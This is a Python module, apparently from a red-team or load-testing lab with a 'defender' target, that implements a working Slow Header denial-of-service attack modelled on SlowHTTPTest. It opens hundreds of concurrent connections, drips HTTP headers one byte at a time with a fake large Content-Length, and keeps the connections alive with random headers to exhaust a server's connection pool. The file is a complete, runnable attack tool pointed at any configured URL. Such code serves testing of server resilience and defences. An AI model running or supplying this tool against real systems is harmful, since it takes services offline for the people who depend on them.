"""Slow Header attack (SlowHTTPTest-style).

Sends the initial HTTP request line, then drips header fields one byte at a
time with a configurable delay between bytes. This keeps the server connection
alive for a long time, exhausting the connection pool.

Reference: https://github.com/shekyan/slowhttptest

Differs from slowloris.py:
  - slowloris: sends full header, then drips X-Pad lines
  - slow_headers: sends request line + headers byte-by-byte from the start
"""
from __future__ import annotations

import asyncio
import logging
import random
import socket
import time
from typing import Any, Dict
from urllib.parse import urlparse

from .metrics import MetricsCollector

log = logging.getLogger("attacker.slow_headers")

BYTE_DELAY_MS = 100  # delay between each byte of the header


def _parse_target(url: str) -> tuple[str, int, str]:
    p = urlparse(url if "://" in url else f"http://{url}")
    host = p.hostname or "localhost"
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port, p.hostname or host


def _build_initial_chunks(endpoint: str, host_header: str,
                          user_agent: str) -> list[bytes]:
    """Build the HTTP request as a list of single-byte chunks."""
    request = (
        f"GET {endpoint} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Accept: */*\r\n"
        # SlowHTTPTest trick: send a very long Content-Length to keep
        # the connection thinking more data is coming
        f"Content-Length: {random.randint(10000, 50000)}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"X-Timeout: {random.randint(1000, 9999)}\r\n"
    )
    # Return as list of single-byte chunks
    return [bytes([b]) for b in request.encode()]


async def _hold_slow(
    host: str,
    port: int,
    host_header: str,
    endpoint: str,
    user_agent: str,
    byte_delay: float,
    deadline: float,
    metrics: MetricsCollector,
) -> None:
    loop = asyncio.get_event_loop()
    sock: socket.socket | None = None
    t0 = time.perf_counter()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        try:
            await asyncio.wait_for(loop.sock_connect(sock, (host, port)), timeout=5.0)
        except (asyncio.TimeoutError, OSError):
            metrics.record(error=True, latency_ms=(time.perf_counter() - t0) * 1000.0)
            return

        # Build the byte-by-byte chunks
        chunks = _build_initial_chunks(endpoint, host_header, user_agent)

        # Send each byte slowly
        for chunk in chunks:
            if time.time() >= deadline:
                break
            try:
                await loop.sock_sendall(sock, chunk)
            except OSError:
                metrics.record(error=True, latency_ms=(time.perf_counter() - t0) * 1000.0)
                return
            await asyncio.sleep(byte_delay)

        # Check for immediate 429
        try:
            sock.setblocking(False)
            data = sock.recv(64)
            if data and b"429" in data:
                metrics.record(blocked=True)
                return
        except (BlockingIOError, OSError):
            pass

        # Connection held successfully — count as success
        metrics.record(success=True, latency_ms=(time.perf_counter() - t0) * 1000.0)

        # Keep connection alive until deadline
        while time.time() < deadline:
            await asyncio.sleep(1.0)
            drip = f"X-Keep-{random.randint(0, 99999)}: {random.randint(0, 99999)}\r\n".encode()
            try:
                await loop.sock_sendall(sock, drip)
            except OSError:
                return
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


async def run(playbook: Dict[str, Any], metrics: MetricsCollector) -> None:
    params = playbook.get("parameters", {})
    target_url: str = params.get("targetUrl", "http://defender:8080")
    endpoints = params.get("targetEndpoints") or ["/"]
    user_agents = params.get("userAgents") or ["Mozilla/5.0"]
    concurrency = int(params.get("concurrentConnections", 100))
    duration = int(params.get("durationSec", 30))

    host, port, host_header = _parse_target(target_url)
    byte_delay = BYTE_DELAY_MS / 1000.0
    deadline = time.time() + duration

    log.info(
        "slow_headers start %s:%d concurrency=%d byte_delay=%.3fs duration=%ds endpoints=%d",
        host, port, concurrency, byte_delay, duration, len(endpoints),
    )

    tasks = []
    for i in range(concurrency):
        ep = endpoints[i % len(endpoints)]
        ua = user_agents[i % len(user_agents)]
        tasks.append(asyncio.create_task(
            _hold_slow(host, port, host_header, ep, ua, byte_delay, deadline, metrics)
        ))
        if i % 50 == 49:
            await asyncio.sleep(0.05)

    await asyncio.gather(*tasks, return_exceptions=True)

    log.info("slow_headers done total=%d ok=%d blocked=%d err=%d",
             metrics.total, metrics.successful, metrics.blocked, metrics.errors)
